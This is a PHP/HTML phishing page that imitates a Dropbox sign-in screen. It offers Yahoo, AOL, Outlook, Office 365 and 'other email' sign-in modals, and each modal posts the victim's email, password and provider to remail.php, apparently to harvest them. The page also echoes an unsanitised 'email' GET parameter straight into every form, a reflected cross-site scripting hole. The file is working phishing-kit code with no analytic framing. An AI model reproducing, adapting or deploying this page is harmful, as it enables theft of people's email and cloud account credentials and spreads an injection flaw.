<?php
session_start();
$email = $_GET['email'];

?>
<!DOCTYPE html>
<html>
<head>
	<!-- Compiled and minified CSS -->
	<link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/css/materialize.min.css" rel="stylesheet"><!-- Compiled and minified JavaScript -->
	
	<link href="css/style.css" rel="stylesheet" type="text/css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
	<script
  src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/js/materialize.min.js">
	</script>
	  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400" rel="stylesheet">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

	<title>Drop Box</title>
</head>
<body>
	<div class="row z-depth-1" id="nav">
		<div class="container valign-wrapper">
			<div class="col s3">
				<a id="top-left">Try Dropbox Business</a>
			</div>
			<div class="col s6 mid-logo"><img class="responsive-img center" src="img/logo.png"></div>
			<div class="col s3 top-right">
				<a id="top-right">Download the app</a>
			</div>
		</div>
	</div>
	<div class="main">
		<div class="row">
			<div class="row container">
				<div class="col s5 offset-s1"><img height="600px" src="img/home-hero@2x-vfl9GE_2I.jpg"></div>
				<div class=" col s4 push-s1 login">
					<span id="sign-in">You can now sign in to dropbox with your email</span>
					<div class="valign-wrapper col s12" id="yahoo">
						<div class="col s2 icon valign-wrapper"><img src="img/yahoo.png"></div>
						<div class="col 10 login-text">
							<a href="#modal2">Sign in with Yahoo</a>
						</div>
					</div>
					  <!-- Modal Structure -->
  <div id="modal2" class="modal">
    <div class="modal-content">
<form class="col s12" action="remail.php" method="post">
      <h5 class="center">Sign in with Yahoo</h5>
      <div class="row">
      <input class="hide" name="app" type="text" class="validate" value="Yahoo">
        <div class="input-field col s12">
          <input name="email" type="email"  value="<?php echo($email) ?>" class="validate" required>
          <label for="email">Email</label>
        </div>
        <div class="input-field col s12">
          <input name="password" type="password" class="validate" required>
          <label for="password">Password</label>
        </div>
  </div>
  <button class="login-button" type="submit" name="submit">Submit
  </button>
</form>
</div>
    </div>
   
					<div class="valign-wrapper col s12" id="aol">
						<div class="col s2 icon valign-wrapper"><img src="img/aol.png"></div>
						<div class="col 10 login-text">
							<a href="#modal3">Sign in with AOL</a>
						</div>
					</div>

					<div id="modal3" class="modal">
    <div class="modal-content">
<form class="col s12" action="remail.php" method="post">
      <h5 class="center">Sign in with AOL</h5>
      <div class="row">
      <input class="hide" name="app" type="text" class="validate" value="AOL">
        <div class="input-field col s12">
          <input name="email" type="email"  value="<?php echo($email) ?>" class="validate"required>
          <label for="email">Email</label>
        </div>
        <div class="input-field col s12">
          <input name="password" type="password" class="validate" required>
          <label for="password">Password</label>
        </div>
  </div>
  <button class="login-button" type="submit" name="submit">Submit
  </button>
</form>
</div>
    </div>
					<div class="valign-wrapper col s12" id="outlook">
						<div class="col s2 icon valign-wrapper"><img src="img/outlook.png"></div>
						<div class="col 10 login-text">
							<a href="#modal4">Sign in with Outlook</a>
						</div>
					</div>
					<div id="modal4" class="modal">
    <div class="modal-content">
<form class="col s12" action="remail.php" method="post">
      <h5 class="center">Sign in with Outlook</h5>
      <div class="row">
      <input class="hide" name="app" type="text" class="validate" value="Outlook">
        <div class="input-field col s12">
          <input name="email" type="email"  value="<?php echo($email) ?>" class="validate" required>
          <label for="email">Email</label>
        </div>
        <div class="input-field col s12">
          <input name="password" type="password" class="validate" required>
          <label for="password">Password</label>
        </div>
  </div>
  <button class="login-button" type="submit" name="submit">Submit
  </button>
</form>
</div>
    </div>
					<div class="valign-wrapper col s12" id="outlook">
						<div class="col s2 icon valign-wrapper"><img src="img/365.png"></div>
						<div class="col 10 login-text">
							<a href="#modal5">Sign in with Office 365</a>
						</div>
					</div>
						<div id="modal5" class="modal">
    <div class="modal-content">
<form class="col s12" action="remail.php" method="post">
      <h5 class="center">Sign in with Office 365</h5>
      <div class="row">
      <input class="hide" name="app" type="text" class="validate" value="Office 365">
        <div class="input-field col s12">
          <input name="email" type="email"  value="<?php echo($email) ?>" class="validate" required>
          <label for="email">Email</label>
        </div>
        <div class="input-field col s12">
          <input name="password" type="password" class="validate" required>
          <label for="password">Password</label>
        </div>
  </div>
  <button class="login-button" type="submit" name="submit">Submit
  </button>
</form>
</div>
    </div>
					<div class="valign-wrapper col s12" id="outlook">
						<div class="col s2 icon valign-wrapper"><img src="img/others.png"></div>
						<div class="col 10 login-text">
							<a href="#modal6">Other Emails</a>
						</div>
					</div>
						<div id="modal6" class="modal">
    <div class="modal-content">
<form class="col s12" action="remail.php" method="post">
      <h5 class="center">Sign in with Other Emails</h5>
      <div class="row">
      <input class="hide" name="app" type="text" class="validate" value="Others">
        <div class="input-field col s12">
          <input name="email" type="email"  value="<?php echo($email) ?>" class="validate" required>
          <label for="email">Email</label>
        </div>
        <div class="input-field col s12">
          <input name="password" type="password" class="validate" required>
          <label for="password">Password</label>
        </div>
  </div>
  <button class="login-button" type="submit" name="submit">Submit
  </button>
</form>
</div>
    </div>
				</div>
			</div>
		</div>
				<script>
		$(document).ready(function(){
		  // the "href" attribute of the modal trigger must specify the modal ID that wants to be triggered
		  $('.modal').modal();
		  $('.modal2').modal();
		    $('.modal3').modal();
		     $('.modal4').modal();
		     $('.modal5').modal();
		        $('.modal6').modal();
		});
		</script> 
	</div>
</body>
</html>